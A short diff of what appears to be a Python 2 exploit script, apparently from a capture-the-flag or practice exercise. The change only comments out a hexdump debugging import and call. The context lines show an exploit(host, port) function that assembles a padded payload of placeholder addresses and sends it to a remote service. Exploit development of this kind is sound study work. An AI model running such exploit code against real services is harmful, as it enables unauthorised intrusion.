@@ -7,7 +7,7 @@ import sys
 import struct
 import resource
 import time
-from hexdump import hexdump
+#from hexdump import hexdump
 
 def usage():
     print "Usage: %s host port" % sys.argv[0]
@@ -105,7 +105,7 @@ def exploit(host, port):
     payload = [padding]
     payload += [0x80491e2, 0xc0ded00d, 0xdeadbeef, 0xc0ded00d] # put your payload here
     payload = list2hexstr(payload)
-    hexdump(payload)
+    #hexdump(payload)
     raw_input("Enter to continue")
     client.send(payload)
     try:
